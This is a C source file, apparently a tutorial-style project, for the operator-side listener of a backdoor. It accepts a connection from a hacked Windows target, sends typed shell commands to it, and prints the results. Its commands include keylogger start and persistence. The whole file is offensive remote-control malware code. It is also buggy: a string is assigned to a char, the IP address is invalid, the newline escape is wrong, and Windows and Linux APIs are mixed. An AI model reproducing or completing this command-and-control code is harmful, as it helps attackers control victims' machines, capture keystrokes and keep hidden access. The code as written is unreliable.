#include <stdio.h>
#include <sys/types.h>
//#include <sys/socket.h>
//#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
//#include <unistd.h>
//#include <arp/inet.h>
#include <stdio.h>
#include <stdlib.h>
//#include <Unistd.h>
#include <WinSock2.h>
#include <Windows.h>
#include <WinUser.h>
#include <WinInet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>


//main function to creat connection/listenning for incomming connection and to send command and recieve response
int main()
{
    int sock;
    int client_socket; //we need clients socket because we are the server, we need our own socket and once the client intitiate the connection to us we also need to store the client socket
    char buffer[1024]; // to transfer the commands
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i=0;
    int optval= 1;
    socklen_t client_length;

    sock= socket(AF_INET, SOCK_STREAM, 0);

//setting socket options
    //if statment in order to check whether our setting or socket object worked, if it didnt we close the program
    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        printf("error setting TCP socket options!\n");
        return 1;
    }

    char ServIP= "192.168.12.345" ; //change this to your ip
    unsigned short ServPort= 50005;
    //defining all diffrent parameters for serAddr because it is a part of a structure stock adress
    server_address.sin_family= AF_INET;//ipv4 coonection
    server_address.sin_addr.s_addr = inet_addr(ServIP); // inet_addr converts string ip adress to an ip adress  format
    server_address.sin_port= htons(ServPort); // htons convert int port to port format  
  
    bind(sock, (struct sockaddr*) &server_address, sizeof(server_address));  //binding server ip and server port 
    listen(sock, 5); //listening to the incoming connection sock is the socket we are listening and 5 is the amount of connection we want to accept
    client_length= sizeof(client_address);
    client_socket= accept(sock, (struct sockaddr*) &client_address, &client_length); //accepting connection request, accept function returns the client socket, we store it in client socket that we will use to communicate with the client

//where we will send the commands
    while(1)
    {
        jump: //jumpig here whener we want.           //bzero is not define here because it exist in linux
        bzero(buffer, 1024); // converting the variable to 0s  
        bzero(&response,sizeof(response)); //its going to store the response that the backdoor sends to us, so we want to clear it every time

        //we need to prompt the user of this server to input a command to send to the target, example... we creat a connection with the client system and we manage to hack the windows 10 machine
        //if we want to see all the files in the desktop dirrectory on the client/target machine; we would need to input somewhere their command and then their commans would be sent to the backdoor
        //and backdoor would execute that their command in its terminal and then it will gather all the response from that which is going to be the output of the directories on the desktop directory
        //and then it will send that respond as a string back to us and then we would print it right here on our screen
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); //inet_ntoa will input clients ip by taking the above argument(ip adress)
        //once we print that we wait the user of the server to input a command and we need to store it somewhere, so we are going to store it in our buffer
        //fgets function will get the string and store it as a first argument which we want to be a buffer so it will store it inside the buffer, the second argument will be the size of the buffer
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "/n"); //removing /n from command lines
        //sending commands to the target
        write(client_socket, buffer, sizeof(buffer));

        if (strncmp("q", buffer, 1) == 0)
        {
            break;
        }
        else if(strncmp("cd ", buffer,3)==0)
        {
            goto jump;
        }
        else if(strncmp("keylog_start", buffer,3)==0)
        {
            goto jump;
        }

        else if(strncmp("persist", buffer, 7) == 0)
        {
            recv(client_socket, response, sizeof(response),0);
            printf("%s", response);
        }
        
        else
        {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }

}
